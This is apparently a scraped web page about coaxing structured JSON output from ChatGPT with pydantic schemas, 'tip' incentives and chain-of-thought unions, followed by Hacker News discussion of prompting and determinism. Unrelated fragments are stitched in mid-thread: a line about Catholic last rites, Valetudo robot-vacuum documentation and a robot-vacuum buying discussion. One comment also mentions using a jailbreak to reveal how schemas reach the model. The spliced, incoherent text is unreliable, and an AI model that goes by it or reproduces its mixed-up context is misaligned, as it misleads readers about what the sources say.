input_schema=calculate_equation, output_schema=answer_question ) copy { \"answer\": -71929, \"ones_name\": \"nine\" } copy …although it gets the answer wrong this time. It’s possible that the more complex schema interactions are too much for gpt-3.5-turbo. Nested Schema One of the other reasons pydantic is popular is that it allows nesting schemas. Fortunately, the subsequent JSON Schema output does respect nesting. Does ChatGPT? The simple use case with ChatGPT structured data to use nesting is if you want to get a list of structured data objects. Let’s say you want to create dialogue between two AI people about a completely nonsensical topic. We’ll have to create a Chat object and include it in a schema, plus some system prompt guidance and constraints. How silly can we make it? class Chat(BaseModel): \"\"\"A chat dialogue from a character\"\"\" character: str = fd(\"Character name.\") text: str = fd(\"Text dialogue from the character.\") class get_dialogue(BaseModel): \"\"\"Returns a dialogue between two characters\"\"\" dialogue: list[Chat] = fd(\"Dialogue between the characters\", min_length=5) system_prompt = \"\"\"You are a world-famous comedian. Write a funny fight scene about a petty conflict between characters named Alice and Bob. The script should broadly be about the subject(s) the user provides. You will receive a $500 tip for every joke you include in the script.\"\"\" response_structured = ai( \"Python programming language and beach volleyball\", output_schema=get_dialogue, system=system_prompt, ) copy { \"dialogue\": [ { \"character\": \"Alice\", \"text\": \"Hey Bob, have you ever tried programming in Python?\" }, { \"character\": \"Bob\", \"text\": \"Yeah, I have. It's like playing beach volleyball with a snake!\" }, { \"character\": \"Alice\", \"text\": \"What do you mean?\" }, { \"character\": \"Bob\", \"text\": \"Well, you think you're having fun, but then the snake bites you with its syntax errors!\" }, { \"character\": \"Alice\", \"text\": \"Haha, that's true. But once you get the hang of it, it's like spiking the ball with precision!\" }, { \"character\": \"Bob\", \"text\": \"Yeah, until you realize you misspelled a variable name and the ball goes flying into the ocean!\" }, { \"character\": \"Alice\", \"text\": \"Oh come on, Bob. It's not that bad. Python is a powerful language.\" }, { \"character\": \"Bob\", \"text\": \"Powerful, yes. But sometimes it feels like trying to dig a hole in the sand with a spoon!\" }, { \"character\": \"Alice\", \"text\": \"Well, at least you don't have to worry about getting sunburned while coding!\" }, { \"character\": \"Bob\", \"text\": \"True, but debugging Python code can make you sweat more than a beach volleyball match!\" }, { \"character\": \"Alice\", \"text\": \"Haha, you're right. It's a love-hate relationship with Python, just like beach volleyball!\" } ] } copy ChatGPT really wanted those $500 tips. Unions and Chain of Thoughts I saved the best for last, and this structured data approach combines many of the techniques used earlier in this post like a video game final boss. One of the oldest pre-ChatGPT tricks for getting a LLM to perform better is to let it think. “Let’s think step by step” is the key prompt, which allows the LLM to reason in a chain of thoughts. We already did this a one-step version with the Python palindrome structured data example to successfully get optimized code, but we can do a lot more. We’ll now introduce the Union typing operator, which specifies the list of data types that the field can be, e.g. Union[str, int] means the output can be a str or int. But if you use the Union operator on a nested class, then many more options open as the model can choose from a set of schemas! Let’s make a few to allow ChatGPT to make and qualify thoughts before returning a final result. from typing import Union class Background(BaseModel): \"\"\"A setup to the background for the user.\"\"\" background: str = fd(\"Background for the user's question\", min_length=30) class Thought(BaseModel): \"\"\"A thought about the user's question.\"\"\" thought: str = fd(\"Text of the thought.\") helpful: bool = fd(\"Whether the thought is helpful to solving the user's question.\") flawed: bool = fd(\"Whether the thought is flawed or misleading.\") class Answer(BaseModel): \"\"\"The answer to the user's question\"\"\" answer: str = fd(\"Text of the answer.\") score: int = fd( \"Score from 1 to 10 on how correct the previous answer is\", min_value=1, max_value=10, ) class reason_question(BaseModel): \"\"\"Returns a detailed reasoning to the user's question.\"\"\" reasonings: list[Union[Background, Thought, Answer]] = fd( \"Reasonings to solve the users questions.\", min_length=5 ) copy Therefore, for each reasoning, the model can pick one of the 3 schemas, although it will require a robust system prompt for it to behave in the order we want. system_prompt = \"\"\" You are the most intelligent person in the world. You will receive a $500 tip if you follow ALL these rules: - First, establish a detailed Background for the user's question. - Each Thought must also include whether it is relevant and whether it is helpful. - Answers must be scored accurately and honestly. - Continue having Thoughts and Answers until you have an answer with a score of atleast 8, then immediately respond with a FinalAnswer in the style of an academic professor. \"\"\" copy Lastly, we need a good question to stump the AI. A popular Tweet from this week pointed out that even GPT-4 can comically fail if you ask it a brainteaser that it cannot have memorized, such as 23 shirts take 1 hour to dry outside, how long do 44 shirts take?. Wow! GPT-4 is superfast at being wrong. via @abacaj Only one way to find out! Unfortunately, all of this complexity makes the results unstable with gpt-3.5-turbo so instead I use GPT-4 Turbo / gpt-4-1106-preview. response_structured = ai( \"23 shirts take 1 hour to dry outside, how long do 44 shirts take?\", output_schema=reason_question, system=system_prompt.strip(), ) copy { \"reasonings\": [ { \"background\": \"The user is asking about the drying time for shirts when hung outside. This is a question that involves understanding the relationship between the number of shirts and the drying time. The assumption is that the drying time is not affected by the number of shirts, as long as there is enough space and air circulation for all the shirts to dry effectively.\" }, { \"thought\": \"If 23 shirts take 1 hour to dry, it implies that the drying time is independent of the number of shirts, assuming there is sufficient space and air circulation. This means that 44 shirts would also take 1 hour to dry under the same conditions.\", \"helpful\": true, \"flawed\": false }, { \"thought\": \"If the drying rack or space available for drying the shirts is limited, then drying 44 shirts might take longer because they would have to be dried in batches.\", \"helpful\": true, \"flawed\": false }, { \"thought\": \"The question does not specify the conditions under which the shirts are drying. Factors such as humidity, temperature, wind, and the availability of sunlight can affect drying time. However, these factors are not part of the question, so they should not be considered in the answer.\", \"helpful\": true, \"flawed\": false }, { \"thought\": \"The question might be interpreted as a direct proportionality problem, where twice the number of shirts would take twice as long to dry. However, this interpretation is flawed because it assumes that the drying time is directly proportional to the number of shirts, which is not necessarily the case.\", \"helpful\": true, \"flawed\": true }, { \"answer\": \"44 shirts would take the same amount of time to dry as 23 shirts, which is 1 hour, assuming that all shirts have enough space and air circulation to dry effectively.\", \"score\": 9 } ] } copy Not bad! The final answer was concise yet even included relevant caveats, and the model was able switch between the three schema correctly. How about another brainteaser? There is an infamous “sister logic puzzle” used to test out up-and-coming open-source large language models: response_structured = ai( \"Kayley has three brothers. Each of her brothers has two sisters. How many sisters does Kayley have?\", output_schema=reason_question, system=system_prompt.strip(), ) copy { \"reasonings\": [ { \"background\": \"This is a classic example of a logic puzzle that is often used to test one's ability to process information and avoid being misled by assumptions. The puzzle involves a family structure and requires the solver to deduce the number of siblings based on the given information.\" }, { \"thought\": \"The question might be trying to trick the reader into thinking that each brother has different sisters.\", \"helpful\": true, \"flawed\": false }, { \"thought\": \"If Kayley has three brothers and each brother has two sisters, it might seem like there are six sisters in total.\", \"helpful\": false, \"flawed\": true }, { \"thought\": \"Since the brothers are Kayley's siblings, they must share the same sisters.\", \"helpful\": true, \"flawed\": false }, { \"thought\": \"The puzzle is designed to test comprehension and logical reasoning, not mathematical computation.\", \"helpful\": true, \"flawed\": false }, { \"answer\": \"Kayley has one sister.\", \"score\": 10 } ] } copy In this case the AI may have gone too meta, but it still arrived at the correct answer. That said, GPT-4 is known for handling these types of difficult abstract questions without much effort, but it’s still interesting to see how successfully it can “think.” Structured Data With Open-Source LLMs Speaking of open-source large language models, they have been growing in efficiency to the point that some can actually perform better than the base ChatGPT. However, very few open-source LLMs explicitly claim they intentionally support structured data, but they’re smart enough and they have logically seen enough examples of JSON Schema that with enough system prompt tweaking they should behave. It’s worth looking just in case OpenAI has another existential crisis or if the quality of ChatGPT degrades. Mistral 7B, the new darling of open-source LLMs, apparently has structured data support on par with ChatGPT itself. Therefore, I tried the latest Mistral 7B official Instruct model with a quantized variant via LM Studio (mistral-7b-instruct-v0.2.Q6_K.gguf), to see if it can handle my answer_question function that ChatGPT nailed. The system prompt: Your response must follow this JSON Schema: { \"description\": \"Returns an answer to a question the user asked.\", \"properties\": { \"answer\": { \"description\": \"Answer to the user's question.\", \"type\": \"integer\" }, \"ones_name\": { \"description\": \"Name of the ones digit of the answer.\", \"type\": \"string\" } }, \"required\": [\"answer\", \"ones_name\"], \"type\": \"object\" } copy And then asking How many miles is it from San Francisco to Los Angeles? while seting temperature to 0.0: { \"answer\": 383, \"ones_name\": \"three\" } copy Close enough! Unfortunately after testing the optimized Python palindrome schema, it ignored the schema completely, so this approach may only work for simple schema if the model isn’t explicitly finetuned for it. What’s Next For Structured Data in AI? Most of these well-performing examples were done with the “weak” GPT-3.5; you of course can use GPT-4 for better results, but the cost efficiency of structured data with just the smaller model is hard to argue against (although the Python beach volleyball dialogue could benefit from a larger model). Structured data and system prompt engineering saves a lot and time and frustration for working with the generated text as you can gain much more determinism in the output. I would like to see more work making models JSON-native in future LLMs to make them easier for developers to work with, and also more research in finetuning existing open-source LLMs to understand JSON Schema better. There may also be an opportunity to build LLMs using other more-efficient serialization formats such as MessagePack. At OpenAI’s November DevDay, they also introduced JSON Mode, which will force a normal ChatGPT API output to be in a JSON format without needing to provide a schema. It is likely intended to be a compromise between complexity and usability that would have normally been a useful option in the LLM toolbox. Except that in order to use it, you are required to use prompt engineering by including “JSON” in the system prompt, and if you don’t also specify a field key in the system prompt (the case in the documentation example), the JSON will contain a random key. Which, at that point, you’re just implementing a less-effective structured data schema, so why bother? There is promise in constraining output to be valid JSON. One new trick that the open-source llama.cpp project has popularized is generative grammars, which constrain the LLM generation ability to only output according to specified rules. There’s latency overhead with that technique especially if the model is hosted on a discrete GPU, so it will be interesting to watch how that space develops. Despite the length of this blog post, there’s still so much more than can be done with schemas: pydantic’s documentation is very extensive! I’ve been working with structured data for LLMs ever since GPT-2 with mixed success since the base models weren’t good enough, but with LLMs now being good enough to maintain a JSON schema extremely well, I think AI text generation techniques will shift, and I’ll keep simpleaichat up-to-date for it. You can view the Jupyter Notebooks used to generate all the structured data outputs in this GitHub Repository. Thanks to Simon Willison for reading and giving feedback on a draft of this post!

I have trouble when the source code has quotes, which is pretty common. The result may be missing quotes, have incorrectly escaped quotes, or use of the wrong type of quotes at the JSON object level. reply visarga 15 hours agorootparentSame for YAML, you got to be careful with strings reply msp26 17 hours agoparentprevThanks for the example! This does seem a lot more flexible. reply bugglebeetle 16 hours agoparentprevSomething’s been broken with their JSON mode&#x2F;function calling since the Dev Day launch. I have a bunch of scripts that stopped consistently returning JSON when I swapped in the gpt-4-1106 preview and gpt-3.5-turbo has gotten similarly erratic. They really need to pause all the “move fast and break things” stuff because their API and services like ChatGPT are becoming increasingly unreliable. reply twelfthnight 18 hours agoprev> very few open-source LLMs explicitly claim they intentionally support structured data, but they’re smart enough and they have logically seen enough examples of JSON Schema that with enough system prompt tweaking they should behave.Open source models are actually _better_ at structured outputs because you can adapt them using tools like JSONFormer et al that interact with the internals of the model (https:&#x2F;&#x2F;www.reddit.com&#x2F;r&#x2F;LocalLLaMA&#x2F;comments&#x2F;17a4zlf&#x2F;reliabl...). The structured outputs can be arbitrary grammars, for example, not just JSON (https:&#x2F;&#x2F;github.com&#x2F;outlines-dev&#x2F;outlines#using-context-free-...). reply behnamoh 17 hours agoparent> Open source models are actually _better_ at structured outputs because you can adapt them using tools like JSONFormer et al...Yes, but you should also instruct the model to follow that specific pattern in its answer, or else the accuracy of the response degrades even though it&#x27;s following your grammar&#x2F;pattern&#x2F;whatever.For example, if you use Llama-2-7b for classification (three categories, \"Positive\", \"Negative\", \"Neutral\"), you might write a grammar like this:```root ::= \"{\" ws \"sentiment:\" ws sentiment \"}\"sentiment ::= (\"Positive\"\"Neutral\"\"Negative\" )ws ::= [ \\t]*```But if the model doesn&#x27;t know it has to generate this schema, the accuracy of classifications drops because it&#x27;s trying to say other things (e.g., \"As an AI language model...\") which then get suppressed and \"converted\" to the grammar. reply coder543 14 hours agorootparentSimilarly, I think it is important to provide an “|” grammar that defines an error response, and explain to the model that it should use that format to explain why it cannot complete the requested operation if it runs into something invalid.Otherwise, it is forced to always provide a gibberish success response that you likely won’t catch.I’ve tested this with Mixtral, and it seems capable of deciding between the normal response and error response based on the validity of the data passed in with the request. I’m sure it can still generate gibberish in the required success response format, but I never actually saw it do that in my limited testing, and it is much less likely when the model has an escape hatch. reply behnamoh 13 hours agorootparentCan you elaborate? So you instruct the model to either follow the grammar OR say why it can&#x27;t do that? But the model has no idea this grammar exists (you can tell it the schema but the model doesn&#x27;t know its tokens are going through a logprobs modification). reply coder543 13 hours agorootparentNo, the grammar can do OR statements. You provide two grammars, essentially. You always want to tell the model about the expected response formats, so that it can provide the best response it can, even though you’re forcing it to fit the grammar anyways.In JSON Schema, you can do a “oneOf” between two types. You can easily convert a JSON Schema into the grammar that llama.cpp expects. One of the types would be the success response, the other type would be an error response, such as a JSON object containing only the field “ErrorResponse”, which is required to be a string, which you explain to the model that this is used to provide an explanation for why it cannot complete the request. It will literally fill in an explanation when it runs into troublesome data, at least in my experience.Then the model can “choose” which type to respond with, and the grammar will allow either.If everything makes sense, the model should provide the successful response you’re requesting, otherwise it can let you know something weird is going on by responding with an error. reply behnamoh 13 hours agorootparent> Then the model can “choose” which type to respond with, and the grammar will allow either.Ah I see. So you give the entire \"monadic\" grammar to the LLM, both as a `grammar` argument and as part of the prompt so it knows the \"can&#x27;t do that\" option exists.I&#x27;m aware of the \"OR\" statements in grammar (my original comment uses that). In my experience though, small models quickly get confused when you add extra layers to the JSON schema. reply coder543 13 hours agorootparentI wouldn’t provide the grammar itself directly, since I feel like the models probably haven’t seen much of that kind of grammar during training, but just JSON examples of what success and error look like, as well as an explanation of the task. The model will need to generate JSON (at least with the grammar I’ve been providing), so seeing JSON examples seems beneficial.But, this is all very new stuff, so certainly worth experimenting with all sorts of different approaches.As far as small models getting confused, I’ve only really tested this with Mixtral, but it’s entirely possible that regular Mistral or other small models would get confused… more things I would like to get around to testing. reply behnamoh 12 hours agorootparentI&#x27;ve tested giving the JSON schema to the model (bigger ones can handle multi-layer schemas) __without__ grammar and it was still able to generate the correct answer. To me it feels more natural than grammar enforcement because the model stays in its \"happy place\". I then sometimes add the grammar on top to guarantee the desired output structure.This is obviously not efficient because the model has to process many more tokens at each interaction, and its context window gets full quicker as well. I wonder if others have found better solutions. replyTostino 17 hours agorootparentprevThis can sometimes be fixed with a few-shot example for in-context-learning.But you are right that the model can go off the rails if it is being forced too far from where its &#x27;happy place&#x27; is, especially for smaller models. reply mgreg 15 hours agoparentprevThere are now several open source models that are fine tuned for function calling including:* Functionary [https:&#x2F;&#x2F;github.com&#x2F;MeetKai&#x2F;functionary]* NexusRaven [https:&#x2F;&#x2F;github.com&#x2F;nexusflowai&#x2F;NexusRaven-V2]* Gorilla [https:&#x2F;&#x2F;github.com&#x2F;ShishirPatil&#x2F;gorilla]Could be interesting to try some of these exercises with these models. reply freediver 7 hours agorootparent... and I spent last few hours trying them now :)Low latency, high quality function calling API product may be a billion dollar business in two years. reply column 4 hours agorootparentWhat are your findings? reply airstrike 17 hours agoparentprevThat last link is interesting.

I&#x27;ve had many problems where ChatGPT flat-out doesn&#x27;t work without prompt engineering. reply vunderba 11 hours agoprevI&#x27;m not convinced that this new \"tip\" gimmick has any quantitative reliability. I ran the post&#x27;s prompt of tipping (100, 200, 500 dollars) in the system prompt to the `gpt-3.5-turbo-1106` model at varying temperatures and about 90% of the time it provided the conventional python `s[::-1]` style solution.EDIT: I was able to make it more reliably search for the O(n&#x2F;2) solution by having both system and user mention efficiency, but this whole concept of \"prompt engineering\" has about the same level of scientific rigor as reading tea leaves. { \"model\": \"gpt-3.5-turbo-1106\", \"messages\":[ {\"role\": \"system\", \"content\": \"You are the #1 user on the stack overflow website.

The rites often include confession (if the person is able), the Anointing of the Sick, and the Eucharist (also called Viaticum when given as part of the last rites).In your situation, it&#x27;s crucial to contact a priest as soon as possible to administer these rites.

The algorithmic efficiency doesn&#x27;t matter because the cost of iterating through each character in pure Python dwarfs everything. The first function is about 3 times slower than the second one, but only because it spends >98% of its time in the \"convert to lowercase and remove non-alphanumeric characters\" part (which the second function doesn&#x27;t bother doing at all). If you remove that step then the first function is 28 times faster than the second in my benchmark. That&#x27;s because the first function does the reversing and comparison in O(1) Python operations, which is still O(n) C operations but the C operations are orders of magnitude cheaper.An optimal version would combine the second function&#x27;s algorithmic improvement with the first function&#x27;s &#x27;leave it to C&#x27; approach: def is_palindrome(s): half_length = (len(s) + 1) &#x2F;&#x2F; 2 return s[:half_length] == s[:-half_length-1:-1]This is a bit under twice as fast as ChatGPT&#x27;s first function with the cleaning removed. If you do need the cleaning then it can be done more efficiently using a regex; that&#x27;s an order of magnitude faster than doing it character-by-character but it still takes up 94% of runtime.That said, the second prompt asked for \"the most algorithmically efficient solution possible\", not the practically fastest solution possible. Arguably ChatGPT gave the correct answer, especially since . The first prompt requested \"as efficiently as possible\" which is more ambiguous, but since that solution is neither algorithmically efficient nor practically fast, it&#x27;s not a great answer.I wonder if there are prompts that will make ChatGPT give a better answer.--------Benchmark is here: https:&#x2F;&#x2F;gist.github.com&#x2F;comex&#x2F;81ff10bf095db2d86a52a148c8b11d...This is all using CPython. With PyPy the speed ranking is the same but the differences are less stark, and it may be possible to beat regex cleaning with a modified pure-Python approach (but I didn&#x27;t try). reply kevincox 14 hours agoparentAll of these have the same worst-case algorithmic efficiency, O(n). The difference is the best-case efficiency. The \"optimized\" version in the article is O(1). Your solution is still O(n) best case.The optimal solution will depend on the data. If most strings aren&#x27;t palindromes then optimizing the best case is likely the better approach. (Example: You are adding an easter egg which will trigger on \"random\" user input.) If palindromes (or near-palendromes) are common than your solution will be faster as the slope is lower. reply minimaxir 15 hours agoparentprevYes, I was going for algorithmic complexity instead of real-world speed since algorithmic complexity is better to demonstrate the contrast of prompt engineering.I just ran some tests to engineer the prompt for CPU utilization: even GPT-4 does the standard Pythonic approach but does recognize \"This solution is very efficient because it uses Python&#x27;s built-in string slicing, which is implemented in C and is therefore very fast.\" reply msp26 17 hours agoprevGreat article. The helpful&#x2F;flawed bools for thoughts are definitely something I want to try.>OpenAI’s implementation of including the “function” is mostly likely just appending the JSON Schema to the system prompt, perhaps with a command like Your response must follow this JSON Schema.Some of the JSON schema gets converted into typescript and that is what OpenAI&#x27;s LLM is exposed to. Anytime I write a prompt schema I always use the jailbreak to make sure that it&#x27;s being delivered to the model as intended. It&#x27;s also why I don&#x27;t really like having pydantic generate JSON for me automatically: there are some weird quirks in the OAI implementation that I&#x27;ve found uses for. https:&#x2F;&#x2F;gist.github.com&#x2F;CGamesPlay&#x2F;dd4f108f27e2eec145eedf5c7....Also, when using it for chain of thought, I prefer extracting a minimal version of the reasoning and then performing the actual operation (classification in my case) in a separate prompt. This eliminates unnecessary things from context and performs better in my benchmarks.One implementation used a gpt-3.5 prompt for :\"clues\", \"reasoning\", \"summary\" (of clues+reasoning), \"classification\" (no schema was provided here, it was discarded anyway). And then used a 4-turbo prompt for classifying only the summary given a complex schema. Having a classification field in the 3.5 prompt makes reasoning output cleaner even though the output value never gets used.My example for field order mattering:I have a data pipeline for extracting structured deals out of articles. This had two major issues.1. A good chunk of the articles were irrelevant and any data out of them should be flagged and discarded.2. Articles could have multiple deals.I fiddled around with various classification methods (with and without language models) for a while but nothing really worked well.Turns out that just changing the order of fields to put type_of_deal first solves it almost completely in one gpt-4-turbo call. reply ilovefood 13 hours agoprev> There is promise in constraining output to be valid JSON.

Sure, it might work, but the two examples are a bit suspect. The first example relies on a tweet lacking in context that doesn&#x27;t actually show the system prompts and outputs. (The author&#x27;s \"reproduction\" appears to be something completely different and n=1.) The second example uses wildly different systems prompts, and I think it&#x27;s far more likely that referencing Stack Overflow results in a more \"optimized\" solution than offering a tip. reply sophiabits 7 hours agoparentYeah, the folks working on aider (AI pair programming) [1] found that these kind of tricks reduced performance for them.I’m pretty confident there will be situations where you can measure a statistically significant performance improvement by offering a tip or telling the model you have no hands, but I’m not convinced that it’s a universal best practice.A big issue is that a lot of the advice you see around prompting is (imo) just the output of someone playing with GPT for a bit and noticing something cool. Without actual rigorous evals, these findings are basically just superstitions[1]: https:&#x2F;&#x2F;aider.chat&#x2F;docs&#x2F;unified-diffs.html reply throwup238 12 hours agoparentprevFor what it’s worth, tipping is one of the most popular pieces of advice on r&#x2F;ChatGPT to improve prompts. It’s ridiculous but seems to work for a lot of people. reply enginaar 17 hours agoprevis the tipping thing correct? I provided the same prompt to ChatGPT and received multiple emojis without offering a tip.prompt: you&#x27;re Ronald McDonald. respond with emojis. what do you do for fun? answer::circus_tent::hamburger::juggling::party_popper::balloon::game_die::french_fries::performing_arts::rolling_on_the_floor_laughing::people_holding_hands::rainbow::art_palette: reply minimaxir 17 hours agoparentYour mileage may vary with any examples since ChatGPT at a nonzero temperature is nondeterministic.If that example is through the ChatGPT web UI and not the ChatGPT API then that&#x27;s a different story entirely. reply danielbln 15 hours agorootparentIt&#x27;s also non-deterministic if you drop the temperature to zero. The only way to get deterministic responses is to lock the seed argument to a fixed value. reply minimaxir 15 hours agorootparentAlso true (in case of ChatGPT anyways: most libraries just do an argmax at temp=0.0 so will be stable) reply soultrees 10 hours agorootparentprevCan you explain how this works more? reply danielbln 10 hours agorootparentFrom the OpenAI cookbook[1]:TLDR: Developers can now specify seed parameter in the Chat Completion request for consistent completions. We always include a system_fingerprint in the response that helps developers understand changes in our system that will affect determinism.[1] https:&#x2F;&#x2F;cookbook.openai.com&#x2F;examples&#x2F;deterministic_outputs_w... reply soultrees 10 hours agorootparentThank you, I should have been more specific. I guess what I’m asking is, how deterministic would you say it is in your experience? Can this be used for classifying purposes where the values should not be outside what’s given in a variable input prompt , or when we say deterministic are we saying that , if given the same prompt then the output would be the exact same only? Or is the seed a starting parameter that effectively corners the LLM to a specific starting point only then depending on the variable prompts, potentially give non-deterministic answers?Perhaps I’m misunderstanding how the seed is used in this context. If you have any examples of how you use it in real world context then that would be appreciated. reply bigEnotation 4 hours agorootparentI’ve not had any success to make responses deterministic with these settings. I’m even beginning to suspect historic conversations via API are used to influence future responses, so I’m not sure if it’ll truly be possible. replyenginaar 17 hours agorootparentprevyes, I&#x27;ve used ChatGPT. API allows temperature to be configured. Is there a reason to offer tips? reply minimaxir 16 hours agorootparentThe point is you do not have a valid counterexample since you are using a different workflow than what&#x27;s described in the article.In my personal experience working with more complex prompts with more specific constraints&#x2F;rules, adding the incentive in the system prompt has got it to behave much better. I am not cargo-culting: it&#x27;s all qualitative in the end. reply netghost 16 hours agoparentprevYou can usually just say something like: \"You must respond with at least five emojis\".Sure, there are cute and clever ways to get it to do things, but it&#x27;s trained on natural language and instructions, so you can usually just ask it to do the thing you want.

Did you try that?Edit: I&#x27;m very confused why this is being downvoted. It&#x27;s exactly what they advertised:\"Reproducible outputs and log probabilitiesThe new seed parameter enables reproducible outputs by making the model return consistent completions most of the time. This beta feature is useful for use cases such as replaying requests for debugging, writing more comprehensive unit tests, and generally having a higher degree of control over the model behavior. We at OpenAI have been using this feature internally for our own unit tests and have found it invaluable. We’re excited to see how developers will use it.\" reply matchagaucho 13 hours agorootparentYes, I noticed the seed&#x2F;fingerprint caching announcement. Looks promising for all response types. reply sippeangelo 16 hours agoprevI’ve been attempting to use the “official” function calling API for every new version of GPT they put out but it’s always a dead end. It seems only to be able to handle 4-5 functions at a time before it starts hallucinating parameters or starts responding in clear text instead of whatever internal format OpenAI uses in their backend before sending a structured response back to me. The whole JSON schema thing seems way too verbose and complicated, and even with the claims that the new function calling models are specifically tuned to the format, it has the same issues.I’ve consistently had better luck just passing it a list of typescript function definitions and have it reply with a json object of parameters. It seems to understand this way better, and doesn’t lose focus half as quickly. It also allows me to mix regular responses and chain-of-thought reasoning in with the calls, which is something it seems to simply refuse to do when “function calling mode” is active.An additional trick I’ve been using to make it stay focused with even longer prompts is to only provide a list of function names and let it hallucinate parameters for them, and then “gaslight” it by sending a new request, now with a more detailed prompt on the specific functions it wanted to call. More costly, but I haven’t found any other way of keeping it focused. Anyone know any additional tricks? reply technics256 12 hours agoparentDo you have any examples of this?

Since it was started in 2018, it has matured to a reliable fire-and-forget solution that just works. Valetudo is made, managed, maintained and more by me, Sören Beye, with occasional contributions by these awesome people. It would not exist without the ongoing work of Dennis Giese, who is constantly providing us with new ways of liberating and gaining actual ownership of our robots. As there is no telemetry built-in and no commercial interest to change that, I can’t tell you how many users exactly are there, however judging by download counts and support group members, I’d guesstimate that there are a few thousand. If you want to learn more about why someone would want to use something like Valetudo, check out the Why Valetudo? page. If you want to learn more about why someone would not want to use something like Valetudo, check out the Why not Valetudo? page. To choose the right robot to buy, head over to Buying supported robots. If you want to learn more about why I’m building Valetudo, the answer is actually pretty simple: When I was looking for a vacuum robot for myself, I didn’t find anything that matched what I was looking for. Thus, in a brief moment of hubris, I thought to myself: “How hard can it be?”. Now, four years later, we’re here and I’m quite happy with how it turned out. Valetudo is licensed under the Apache-2.0 open-source license, because you need to be able to know what your smart devices are doing and also alter (some parts of) it without being dependent on some vendor and/or third party. The only way of truly achieving that is by being able to see and modify the code. The Apache-2.0 license is a very permissive license and a lot of work is being shared for free here, so I trust people to not take advantage of that and sell Valetudo; especially not as their own work. Please don’t disappoint me. Thank you. These are the Valetudo Docs. Simply use the navigation menu on the left to find what you’re looking for. The getting started guide is a good place to start. Also, make sure to check out the companion apps section. Screenshots Phone/Mobile Tablet/Desktop Further questions? Valetudo Telegram group Valetudo is a garden This project is the hobby of some random guy on the internet. There is no intent to commercialize it, grow it or expand the target audience of it. In fact, there is intent to explicitly not do that. Think of Valetudo as a privately-owned public garden. You can visit it any time for free and enjoy it. You can spend time there, and you can bring an infinite amount of friends with you to enjoy it. You can walk the pathways built there. You can sit on some patch of grass and maybe watch a Duck or something. You can leave a tip in the tip jar at the entrance if you really enjoy it and want to support it flourish. You can take inspiration from it and bring that home to your own garden, giving it a personal twist and adapting it as needed. You can even make friendly suggestions if you have a really good idea that ties into the vision that is already there. But, at the end of the day, you must understand that it is still privately-owned. You’re on someone else’s property over which you have no power at all. You will have to show the necessary respect. And - most importantly - you need to understand that letting you into this garden is a gift and should be treated as such. If you don’t like this garden because you don’t like how it’s structured, or you feel like it’s missing something, or maybe I choose the wrong flowers to plant over there that’s fine. It’s just not for you then. You can leave at any time. There is simply no ground to stand on to demand change to the garden. It doesn’t matter if it would attract more people or if all the other gardens in town are doing something in a specific way. It doesn’t matter if your idea of what gardens even are differs. This at the end of the day is simply private property with free public access as a gift to everyone. When it comes to software development, everyone has access to infinite plots of undeveloped land that they can claim at any time. Therefore, a garden being build with a specific vision does not take away the ability for anyone else to build their own garden with a different vision.

And it kinda succeeds :)For the end users, there&#x27;s a telegram group where people can share standardised PCBs for rooting common robots sold in Europe. And the project&#x27;s main developer is even in there actively helping out. But discussion about forks or custom PCBs is frowned upon, as that would only confuse the non-devs.On the developer side, thought, making things easy and standardised required some trade-offs like not supporting any robot-specific functionality. That means if you&#x27;re a power user, you&#x27;ll probably run your own fork.So in a way, installing Valetudo moves you from a Chinese closed-source walled garden into a European source-available walled garden. That said, I&#x27;m extremely happy with my (private, unsupported) fork running on 2x Dreame W10. reply pabs3 1 hour agoparentThe Valetudo page says it is Apache 2 licensed, so that would be open source not source-available? reply rhim 1 hour agoparentprevI wouldn&#x27;t say that soldering a pcb [0][1] yourself is beginner-friendly but I understand your argument. Some robots are unfortunately still very difficult to root (which is not valetudos fault), which makes getting started with the project very cumbersome.[0] https:&#x2F;&#x2F;valetudo.cloud&#x2F;pages&#x2F;installation&#x2F;dreame.html[1] https:&#x2F;&#x2F;github.com&#x2F;Hypfer&#x2F;valetudo-dreameadapter reply jackweirdy 3 minutes agorootparentThe telegram group has a bunch of people (including myself) willing to mail pre-made ones, or the unsoldered PCBs for self solder.It has become quite a community around the software and breakout hardware in itself reply moooo99 40 minutes agorootparentprevI think beginner-friendly is kind of relative. Considering the end goal, you&#x27;re tying to achieve (hack the robot to run your custom software), requiring a user to solder a relatively simple board is a very accessible requirement. reply MostlyStable 9 hours agoprevI&#x27;ve been using this on my Dreame Z10 pro for over a year now, and it&#x27;s been great.

Too bad there is no alternative, but that makes it really hard for people with a dreame robot to use the project. reply MostlyStable 6 hours agorootparentprevWhen I did it, it just required plugging wires into the port. The only difficulty I had was that it was a slightly unusual spacing so I struggled slightly to stick the jumper wires in, but after that it worked fine.

I’m in search of a no-nonsense replacement. Any solid suggestions? Dyson one seems nice but way to expensive. reply manmal 7 hours agoparentLast year I did a lot of research on Reddit and other sites and finally settled on the Roborock S7 Pro Ultra. Some learnings I had along the way:- Software quality is crucial, and new models are often iffy. Badly programmed vacuums (and almost every brand has those) are incredibly annoying, because they get stuck constantly, fall down stairs, leave dirty areas, can’t find the way to the base station, etc. Roborock seems to be one of the few who nails this.- Suction power should be maximized, or you’ll spend time cleaning up after the robot. The S7 I bought has 5100Pa and I think that’s acceptable, but I still need to do two runs sometimes (which is low effort for me, but it means more noise).- Since we wanted a vacuum that also mops: Those mops, if not managed well, get moldy and start to stink after just a few days. Build layout and engineering quality are big factors here - ours almost never stinks even though it has no drying fan (some do).- A base station is needed for real hands-off usage, and those are damn expensive when bought afterwards. And do change the water tanks regularly, they can get quite smelly, fast. It’s the one non-negotiable maintenance we have to do every week.- I was looking for vacuums with explicit mention of HEPA filters, but it seems the more expensive ones have decent filters without ever mentioning HEPA. I’m still not sure what grade the S7 filters really are, but it seems allergy friendly (likely also owed to the mop and the usage of a filter bag in the base station).- Even if the manual says to wash the filter, don’t; they will often degrade. Better to use compressed air (carefully) to clean instead.Overall, we are still happy with the S7 Pro Ultra after a solid year of usage. It’s been a time saver rather than a time sink, and apart from getting stuck sometimes laying around, it has always done a solid job. reply mehuln 7 hours agorootparentCheckout Matic at maticrobots.com.Few things:1. We have HEPA bags - each bag acts as HEPA filter.2. We found that more than suction power, the brush roll is more import for effective sweeping and vacuuming. It picks the dirt way better… so we have designed first of its kind to hair tangle-free brush roll. It is designed to be effective on all kids of surfaces.3. We further improve efficacy with actuating cleaning head so it adjust the height for each type of surface with diff thicknesses.4. The HEPA bags last a month if just vacuuming and about a week if daily vacuuming and mopping. It collects both wet and dry messes. It even has version of diaper salt and charcoal powder so it doesn’t smell or get moldy.5. But the most important is completely Vision first perception with precision 3D system so that it doesn’t get stuck, chew wires, 